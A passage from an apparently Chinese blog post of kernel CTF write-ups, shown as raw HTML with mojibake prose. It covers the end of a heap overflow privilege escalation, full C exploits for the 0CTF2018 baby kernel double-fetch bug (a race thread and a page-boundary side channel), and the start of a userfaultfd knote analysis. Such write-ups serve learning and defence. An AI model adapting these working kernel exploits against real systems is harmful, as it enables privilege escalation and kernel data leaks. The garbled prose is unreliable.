class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x200</span>;i++)<br>        seq_fd[i]=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">0x200</span> ;i++)<br>        read(seq_fd[i],data,<span class="hljs-number">1</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸææƒ<img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/06kernelheapoverflow.png" alt="06kernelheapoverflow"></p><h2 id="06-double-fetch">06.double fetch</h2><p>double fetchå¯ä»¥ç†è§£ä¸ºä¸¤æ¬¡æˆ–å¤šæ¬¡å¯¹åŒä¸€ä¸ªå¯¹è±¡å–å€¼</p><p>ä¾‹ï¼šå†…æ ¸å¯¹ä¸€ä¸ªå¯¹è±¡ç¬¬ä¸€æ¬¡å–å€¼è¿›è¡Œåˆæ³•æ€§æ£€æµ‹ï¼Œç¬¬äºŒæ¬¡å–å€¼è¿›è¡Œä½¿ç”¨</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡å–å€¼åå¯¹å€¼è¿›è¡Œä¿®æ”¹æˆæ¶æ„æ•°æ®ï¼Œåœ¨ç¬¬äºŒæ¬¡ä½¿ç”¨æ—¶æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„æ•°æ®</p><blockquote><p>é€šè¿‡åœ¨ first fetch ä¸ second fetch ä¹‹é—´çš„ç©ºæŒ¡ä¿®æ”¹æ•°æ®ä»è€Œæ”¹å˜å†…æ ¸æ‰§è¡Œæµçš„åˆ©ç”¨æ‰‹æ³•ä¾¿è¢«ç§°ä¹‹ä¸º<code>double fetch</code></p></blockquote><h3 id="0CTF2018-Final-baby-kernel">0CTF2018 Final-baby kernel</h3><p>å‡ å¹´å‰çš„é¢˜ç›®å°±æ˜¯äº²åˆ‡ï¼Œç°åœ¨é¢˜ç›®éƒ½æ˜¯ä»€ä¹ˆå¦–é­”é¬¼æ€ª</p><h4 id="0x01ç¨‹åºåˆ†æ-4">0x01ç¨‹åºåˆ†æ</h4><p>è€Œå•è¿›ç¨‹çš„å†…æ ¸å¾ˆéš¾è§¦å‘double fetchæ¼æ´ï¼Œå› æ­¤éœ€è¦åœ¨QEMUå¯åŠ¨æ—¶è®¾ç½®å¥½å†…æ ¸å’Œè¿›ç¨‹æ•°å¦‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">-m 256M -smp 2,<span class="hljs-attribute">cores</span>=2,threads=1  \<br></code></pre></td></tr></table></figure><p>ä¿æŠ¤ä»€ä¹ˆéƒ½æ²¡å¼€</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">qemu-system-x86_64 \<br>-m 256M -smp 2,cores=2,threads=1  \<br>-kernel ./vmlinuz-4.15.0-22-generic \<br>-initrd  ./core.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \<br>-cpu qemu64 \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic  \<br></code></pre></td></tr></table></figure><p>è½½å…¥äº†baby.koé©±åŠ¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br>echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag<br>chown root:root flag<br>chmod 400 flag<br>exec 0&lt;/dev/console<br>exec 1&gt;/dev/console<br>exec 2&gt;/dev/console<br><br>insmod baby.ko<br>chmod 777 /dev/baby<br>echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;<br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure><p>baby.koé©±åŠ¨é‡Œåªå®šä¹‰äº†baby_ioctlï¼Œé‡Œé¢æ˜¯è¿™ä¸ªå‡½æ•°</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684499630049.png" alt="1"></p><p><strong>åˆ†æä¸€ä¸‹å®ƒåšäº†å•¥ï¼š</strong></p><p>å¦‚æœé€‰é¡¹0x6666ä¼šå‘Šè¯‰æˆ‘ä»¬é¢˜ç›®ç»™çš„flagçš„åœ°å€</p><p>å¦‚æœé€‰é¡¹0x1337,ä¸€å¼€å§‹ä¼šæœ‰ä¸‰ä¸ªæ£€æŸ¥</p><p><strong>å‰ä¸¤ä¸ªæ£€æŸ¥</strong>ç”¨äº†<code>_chk_range_not_ok</code>å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//_chk_range_not_okå‡½æ•°</span><br><span class="hljs-type">bool</span> __fastcall _chk_range_not_ok(__int64 a1, __int64 a2, <span class="hljs-type">unsigned</span> __int64 a3)<br>&#123;<br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// cf</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdi</span><br><br>  v3 = __CFADD__(a2, a1);<br>  v4 = a2 + a1;<br>  <span class="hljs-keyword">return</span> v3 || a3 &lt; v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„<code>__CFADD__</code>åœ¨idaçš„å®å®šä¹‰æ˜¯</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// carry flag of addition (x+y)</span><br><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">class</span> <span class="hljs-title class_">T</span>, <span class="hljs-keyword">class</span> <span class="hljs-title class_">U</span>&gt; int8 __CFADD__(T x, U y)<br>&#123;<br>  <span class="hljs-type">int</span> size = <span class="hljs-built_in">sizeof</span>(T) &gt; <span class="hljs-built_in">sizeof</span>(U) ? <span class="hljs-built_in">sizeof</span>(T) : <span class="hljs-built_in">sizeof</span>(U);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint8</span>(x) &gt; <span class="hljs-built_in">uint8</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">2</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint16</span>(x) &gt; <span class="hljs-built_in">uint16</span>(x+y);<br>  <span class="hljs-keyword">if</span> ( size == <span class="hljs-number">4</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint32</span>(x) &gt; <span class="hljs-built_in">uint32</span>(x+y);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">uint64</span>(x) &gt; <span class="hljs-built_in">uint64</span>(x+y);<br>&#125;<br></code></pre></td></tr></table></figure><p>add æŒ‡ä»¤ä¼šå½±å“ CFï¼ˆäº§ç”Ÿè¿›ä½/å€Ÿä½ï¼‰å’Œ OFï¼ˆä¸¤æ•°æœ€é«˜ä½ç›¸åŒï¼Œç»“æœæœ€é«˜ä½æ”¹å˜ï¼‰æ ‡å¿—ä½ï¼Œv3è·å¾—çš„å°±æ˜¯ä¸¤æ•°ç›¸åŠ çš„ CF ä½ï¼Œè¿™é‡Œä¸€èˆ¬ä¸º0,æ‰€ä»¥å¯ä»¥ä¸ç®¡è¿™ä¸ª</p><p>a3æˆ‘ä»¬è¦è¾“å…¥çš„æ˜¯ç»“æ„ï¼Œç»“æ„åˆ†æåå‘ç°æ˜¯</p><p>ä¹Ÿå°±æ˜¯å­˜flag_strçš„æŒ‡é’ˆï¼Œå’Œflagçš„é•¿åº¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br><span class="hljs-type">char</span> * flag_str<br><span class="hljs-type">int</span> flag_len<br>&#125;<br></code></pre></td></tr></table></figure><p>æ€»çš„æ¥è®²</p><p><strong>ç¬¬ä¸€ä¸ªæ£€æŸ¥</strong>åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„ç»“æ„ä½“æ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´</p><p><strong>ç¬¬äºŒä¸ªæ£€æŸ¥</strong>åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„flag_stræ˜¯å¦åœ¨ç”¨æˆ·ç©ºé—´</p><p><strong>ç¬¬ä¸‰ä¸ªæ£€æŸ¥</strong>åˆ¤æ–­æˆ‘ä»¬è¾“å…¥çš„flag_strçš„lenæ˜¯å¦ç­‰äºé¢˜ç›®ç»™çš„flagçš„é•¿åº¦</p><p>æ‰€æœ‰æ£€æŸ¥é€šè¿‡åå¯¹é€ä¸ªå­—ç¬¦ä¸é¢˜ç›®ç»™çš„flagè¿›è¡Œæ¯”è¾ƒï¼Œéƒ½æ¯”è¾ƒæˆåŠŸäº†çš„è¯æ‰“å°é¢˜ç›®çš„flag</p><h4 id="0x02è§£æ³•1ï¼šæ¡ä»¶ç«äº‰">0x02è§£æ³•1ï¼šæ¡ä»¶ç«äº‰</h4><p>æ­£å¸¸æ¥è®²æˆ‘ä»¬ç”¨æˆ·æ€æ˜¯æ— æ³•ä½¿ç”¨å†…æ ¸æ€çš„æŒ‡é’ˆ</p><p>é¦–å…ˆ0x6666é€‰é¡¹å¾—åˆ°flagçš„åœ°å€</p><p>æ¥ç€åˆ›å»ºç«äº‰çº¿ç¨‹ï¼Œä¸€ç›´é‡å¤ä¿®æ”¹æˆ‘ä»¬ä¸å†…æ ¸äº¤äº’çš„.flag_addræŒ‡é’ˆä¸ºå†…æ ¸flagçš„åœ°å€</p><p>åŸè¿›ç¨‹åˆ™ä¸€ç›´é€šè¿‡0x1337é€‰é¡¹ä¸å†…æ ¸äº¤äº’ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œæ£€æŸ¥é€šè¿‡åŸæœ¬bufåœ¨ç”¨æˆ·æ€çš„æŒ‡é’ˆï¼Œå†æ¬¡ä½¿ç”¨è¯¥æŒ‡é’ˆæ—¶ï¼Œå·²ç»ç”±äºæˆ‘ä»¬æ¡ä»¶ç«äº‰æŒ‡å‘äº†å†…æ ¸æ€çš„flagåœ°å€ï¼Œç¨‹åºå°±å‘Šè¯‰äº†æˆ‘ä»¬flag</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -lpthread -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> tidp;<br><span class="hljs-type">int</span> competetion_times=<span class="hljs-number">0x10</span>,status=<span class="hljs-number">1</span>;<br><span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> real_addr;<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x20</span>]=<span class="hljs-string">&quot;will be dropped&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">char</span> *flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag=&#123;.flag_addr=buf,.flag_len=<span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">competetionThread</span><span class="hljs-params">(<span class="hljs-type">void</span>  *arg)</span><br>&#123;<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;competetion_times;i++);<br>            flag.flag_addr=(<span class="hljs-type">char</span> *)real_addr;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd,addr_fd,test_fd;<br>    <span class="hljs-type">char</span> * temp,*locate_addr_str;<br>    fd=open(<span class="hljs-string">&quot;/dev/baby&quot;</span>,O_RDWR);<br>    ioctl(fd,<span class="hljs-number">0x6666</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag &gt;addr.txt&quot;</span>);<br>    addr_fd=open(<span class="hljs-string">&quot;./addr.txt&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span>(addr_fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]err open addr.txt!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    temp=(<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    temp[read(addr_fd,temp,<span class="hljs-number">0x40</span>)]=<span class="hljs-string">&#x27;\0&#x27;</span>;<br>    locate_addr_str=<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;Your flag is at &quot;</span>)+ <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;Your flag is at &quot;</span>);;<br>    real_addr = strtoull(locate_addr_str,locate_addr_str+<span class="hljs-number">0x10</span>, <span class="hljs-number">16</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag_addr=%llx\n&quot;</span>,real_addr);<br><br>    pthread_create(&amp;tidp, <span class="hljs-literal">NULL</span>, competetionThread, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span>(status)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;competetion_times;i++)<br>        &#123;<br>            flag.flag_addr=buf;<br>            ioctl(fd,<span class="hljs-number">0x1337</span>,&amp;flag);<br>        &#125;<br>        system(<span class="hljs-string">&quot;dmesg|grep flag &gt; result.txt&quot;</span>);<br>        test_fd=open(<span class="hljs-string">&quot;./result.txt&quot;</span>,O_RDONLY);<br>        read(test_fd,temp,<span class="hljs-number">0x1000</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(temp,<span class="hljs-string">&quot;flag&#123;&quot;</span>))<br>            status=<span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    pthread_cancel(tidp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]successful competetion\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;dmesg|grep flag&quot;</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/2-1684499630049.png" alt="2"></p><h4 id="0x03è§£æ³•2ï¼šæµ‹ä¿¡é“æ”»å‡»">0x03è§£æ³•2ï¼šæµ‹ä¿¡é“æ”»å‡»</h4><p>ç”±äºæ˜¯ flag æ˜¯ç¡¬ç¼–ç çš„ï¼Œå¹¶ä¸”æ˜¯æ£€æŸ¥æ–¹æ³•æ˜¯é€å­—èŠ‚æ¯”è¾ƒï¼Œå› æ­¤å¯ä»¥é€å­—èŠ‚çˆ†ç ´æ¥å¾—åˆ° flagã€‚</p><p>æ–¹æ³•æ˜¯å°†å¾…çˆ†ç ´çš„å­—èŠ‚æ”¾åœ¨ mmap ç”³è¯·çš„å†…å­˜é¡µæœ«ä½ï¼Œæ­¤æ—¶ä¸‹ä¸€å­—èŠ‚ä½äºä¸å¯è¯»å†™çš„ç”¨æˆ·æ€ç©ºé—´ã€‚</p><p>å¦‚æœæˆ‘ä»¬æˆåŠŸçš„çŒœå¯¹äº†ä¸€ä¸ªå­—èŠ‚ï¼Œå°±ä¼šç»§ç»­å¾€ä¸‹è¯»ï¼Œä¸‹ä¸€å­—èŠ‚ä½äºä¸å¯è¯»å†™çš„ç”¨æˆ·æ€ç©ºé—´ï¼Œè¯»å–ä¼šå¯¼è‡´<code>kernel panic</code>ï¼Œä»è€Œå¯ä»¥åˆ¤æ–­æ˜¯å¦çˆ†ç ´çš„ä¸€ä¸ªå­—èŠ‚æ­£ç¡®ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">|------------------------------|    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|   |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- page alloc by mmap</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                   flag&#123;.....X|</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">|                              |    &lt;---- unallocated page</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|                              |</span><br><span class="hljs-comment">|------------------------------|</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥æ‹¿arttnba3å¸ˆå‚…çš„è„šæœ¬ï¼Œç”¨mainçš„argv[1]æ¥ä¼ å˜é‡ï¼Œä¸ç”¨æ¯æ¬¡ç¼–è¯‘è¿›è¡Œçˆ†ç ´</p><p>å…³äºè¿œç«¯ä¼ æ–‡ä»¶ç”±äºæœ¬äººè¿˜æ²¡è¯•è¿‡ï¼Œçœ‹èµ·æ¥æ˜¯å¾ˆéº»çƒ¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc cexindao.c -static -o cexindao</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> * flag_addr;<br>    <span class="hljs-type">int</span> flag_len;<br>&#125;flag = &#123; .flag_len = <span class="hljs-number">33</span>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> ** argv, <span class="hljs-type">char</span> ** envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fd, flag_len;<br>    <span class="hljs-type">char</span> * buf, *flag_addr;<br><br>    <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;usage: ./exp flag&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    flag_len = <span class="hljs-built_in">strlen</span>(argv[<span class="hljs-number">1</span>]);<br>    <br>    fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDWR);<br>    buf = (<span class="hljs-type">char</span>*) mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    flag_addr = buf + <span class="hljs-number">0x1000</span> - flag_len;<br>    <span class="hljs-built_in">memcpy</span>(flag_addr, argv[<span class="hljs-number">1</span>], flag_len);<br>    flag.flag_addr = flag_addr;<br>    ioctl(fd, <span class="hljs-number">0x1337</span>, &amp;flag);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="07-userfaultfd">07.userfaultfd</h2><p>userfaultfdæ˜¯ä¸€ä¸ªå¸¸è§„çš„ä¸ç¼ºé¡µå¤„ç†ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼Œ</p><p>æˆ‘ä»¬å¯ä»¥<strong>åˆ©ç”¨è¿™ä¸ªæœºåˆ¶æ§åˆ¶è¿›ç¨‹æ‰§è¡Œæµç¨‹çš„å…ˆåé¡ºåºï¼Œä»è€Œä½¿å¾—å¯¹æ¡ä»¶ç«äº‰çš„åˆ©ç”¨æˆåŠŸç‡å¤§å¹…æé«˜</strong></p><h3 id="D-3CTF2019-knote">D^3CTF2019 - knote</h3><h4 id="0x01ç¨‹åºåˆ†æ-5">0x01ç¨‹åºåˆ†æ</h4><p>å¼€å¯äº†smep/smap,å¼€å¯äº†kaslr</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>cd /home/ctf<br>qemu-system-x86_64 \<br>-m 128M \<br>-kernel ./bzImage \<br>-initrd  ./rootfs.cpio \<br>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot; \<br>-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \<br>-nographic \<br>-monitor /dev/null \<br>-smp cores=2,threads=1 \<br>-cpu qemu64,+smep,+smap<br></code></pre></td></tr></table></figure><p>åªæŒ‚è½½note.ko,æƒ¯ä¾‹æ¼æ´åœ¨è¿™</p><p>idaå¯ä»¥åˆ†æå‡ºioctlç¬¬ä¸‰ä¸ªå‚æ•°ä¼ å…¥çš„ç»“æ„ä¸º</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">chunk</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span>&#123;</span><br>        <span class="hljs-type">size_t</span> index;<br>        <span class="hljs-type">size_t</span> size;<br>    &#125;<br>    <span class="hljs-type">char</span> *ptr;<br>&#125;mychunk;<br></code></pre></td></tr></table></figure><p>é©±åŠ¨å¤§ä½“å®ç°äº†å †èœå•ç®¡ç†ï¼Œæ¥åˆ†æä¸‹</p><h5 id="1-add">1.add</h5><p>å¤§ä½“æ˜¯éå†æ‰¾ç»´æŠ¤æ•°ç»„buf[i]æœ‰æ— ç©ºçš„ï¼Œå¦‚æœä¸ºç©ºï¼Œä¸”sizeå°äº0xfff</p><p>åˆ™kmallocåˆ†é…sizeå¤§å°çš„å†…å­˜ï¼Œä¸”å¡«å…¥ç»´æŠ¤æ•°ç»„</p><p>è¿™é‡ŒåŠ äº†å†™é”ï¼Œä¹Ÿå°±æ˜¯ç‹¬å é”ï¼Œå†™çš„æ—¶å€™åªèƒ½ä¸€ä¸ªè¿›ç¨‹å†™ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">buf[i].<span class="hljs-attribute">ptr</span>=åˆ†é…å†…å­˜çš„åœ°å€<br>buf[i].<span class="hljs-attribute">size</span>=å†…å­˜çš„å¤§å°<br></code></pre></td></tr></table></figure><h5 id="2-delete">2.delete</h5><p>å°±æ˜¯kfreeé‡Šæ”¾æ‰ç”³è¯·çš„å†…å­˜ï¼Œç»´æŠ¤æ•°ç»„buf[i]ç½®é›¶</p><p>è¿™é‡Œä¹ŸåŠ äº†å†™é”ã€‚</p><p>buf[i].ptr=0<br>buf[i].size=0</p><h5 